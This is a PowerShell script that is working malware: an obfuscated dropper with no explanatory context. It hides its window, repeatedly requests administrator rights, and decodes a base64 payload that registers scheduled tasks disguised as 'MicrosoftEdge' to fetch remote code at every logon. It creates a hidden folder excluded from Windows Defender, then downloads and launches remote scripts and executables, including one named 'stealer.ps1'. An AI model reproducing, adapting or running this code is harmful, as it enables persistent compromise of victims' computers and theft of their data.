Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class ConsoleWindowUtils {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll")]
        public static extern IntPtr GetParent(IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        public static IntPtr GetTargetWindow() {
            IntPtr consoleWindow = GetConsoleWindow();
            IntPtr parentWindow = GetParent(consoleWindow);
            
            if (parentWindow == IntPtr.Zero) {
                return consoleWindow;
            }
            return parentWindow;
        }
    }
"@

[ConsoleWindowUtils]::ShowWindow([ConsoleWindowUtils]::GetTargetWindow(), 0) | Out-Null

Set-ExecutionPolicy Bypass -Scope Process -Force
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    while(1) {
        try {
            $code = ("https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/download.ps1")
            $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$code')"
            Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru -Verb RunAs
            exit;
        } catch {}
    }
}

$base64String = "JHRhc2tfbmFtZSA9ICJNaWNyb3NvZnRFZGdlIgokdGFza19hY3Rpb24gPSBOZXctU2NoZWR1bGVkVGFza0FjdGlvbiAtRXhlY3V0ZSAibXNodGEuZXhlIiAtQXJndW1lbnQgInZic2NyaXB0OmNyZWF0ZW9iamVjdChgIndzY3JpcHQuc2hlbGxgIikucnVuKGAicG93ZXJzaGVsbCBgaXdyKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vNDNhMTcyMy90ZXN0L21haW4vZG93bmxvYWQucHMxJyl8aWV4YCIsMCkod2luZG93LmNsb3NlKSIKJHRhc2tfdHJpZ2dlciA9IE5ldy1TY2hlZHVsZWRUYXNrVHJpZ2dlciAtQXRMb2dPbgokdGFza19zZXR0aW5ncyA9IE5ldy1TY2hlZHVsZWRUYXNrU2V0dGluZ3NTZXQgLUFsbG93U3RhcnRJZk9uQmF0dGVyaWVzIC1Eb250U3RvcElmR29pbmdPbkJhdHRlcmllcyAtUnVuT25seUlmTmV0d29ya0F2YWlsYWJsZSAtRG9udFN0b3BPbklkbGVFbmQgLVN0YXJ0V2hlbkF2YWlsYWJsZQpSZWdpc3Rlci1TY2hlZHVsZWRUYXNrIC1BY3Rpb24gJHRhc2tfYWN0aW9uIC1UcmlnZ2VyICR0YXNrX3RyaWdnZXIgLVNldHRpbmdzICR0YXNrX3NldHRpbmdzIC1UYXNrTmFtZSAkdGFza19uYW1lIC1EZXNjcmlwdGlvbiAid2luZG93cyBzdGFydHVwIGZpbGUiIC1SdW5MZXZlbCBIaWdoZXN0IC1Gb3JjZQpXcml0ZS1Ib3N0ICJbIV0gUGVyc2lzdGVuY2UgQWRkZWQiIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4KCiR0YXNrX25hbWUgPSAiTWljcm9zb2Z0RWRnZ2UiCiR0YXNrX2FjdGlvbiA9IE5ldy1TY2hlZHVsZWRUYXNrQWN0aW9uIC1FeGVjdXRlICJtc2h0YS5leGUiIC1Bcmd1bWVudCAidmJzY3JpcHQ6Y3JlYXRlb2JqZWN0KGAid3NjcmlwdC5zaGVsbGAiKS5ydW4oYCJwb3dlcnNoZWxsIGBpd3IoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9FVklMLUQtRS1WL00vcmVmcy9oZWFkcy9tYWluL2Rvd25sb2FkLnBzMScpfGlleGAiLDApKHdpbmRvdy5jbG9zZSkiCiR0YXNrX3RyaWdnZXIgPSBOZXctU2NoZWR1bGVkVGFza1RyaWdnZXIgLUF0TG9nT24KJHRhc2tfc2V0dGluZ3MgPSBOZXctU2NoZWR1bGVkVGFza1NldHRpbmdzU2V0IC1BbGxvd1N0YXJ0SWZPbkJhdHRlcmllcyAtRG9udFN0b3BJZkdvaW5nT25CYXR0ZXJpZXMgLVJ1bk9ubHlJZk5ldHdvcmtBdmFpbGFibGUgLURvbnRTdG9wT25JZGxlRW5kIC1TdGFydFdoZW5BdmFpbGFibGUKUmVnaXN0ZXItU2NoZWR1bGVkVGFzayAtQWN0aW9uICR0YXNrX2FjdGlvbiAtVHJpZ2dlciAkdGFza190cmlnZ2VyIC1TZXR0aW5ncyAkdGFza19zZXR0aW5ncyAtVGFza05hbWUgJHRhc2tfbmFtZSAtRGVzY3JpcHRpb24gIndpbmRvd3Mgc3RhcnR1cCBmaWxlIiAtUnVuTGV2ZWwgSGlnaGVzdCAtRm9yY2UKV3JpdGUtSG9zdCAiWyFdIFBlcnNpc3RlbmNlIEFkZGVkIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuCgo"
$bytes = [System.Convert]::FromBase64String($base64String)
$decodedString = [System.Text.Encoding]::UTF8.GetString($bytes)
Invoke-Expression $decodedString

$rdir = "$env:SystemDrive\ProgramData\Steam"
$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
New-Item -ItemType Directory -Path $dir
Add-MpPreference -ExclusionPath $dir
attrib +h +s $dir

$shellcode = ("https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/antiremove")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru

$shellcode = ("https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/shellcode/stealer.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru

# $shellcode = ("https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/shellcode/Xclienta.ps")
# $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
# Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru

$shellcode = ("https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/shellcode/Xclient.ps")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru

$url = "https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/XClienta.exe"
$output = "$dir\Updatecli4mt.scr"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output

$url = "https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/pyslion/lmao.vmp.exe"
$output = "$dir\pysil0n.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output
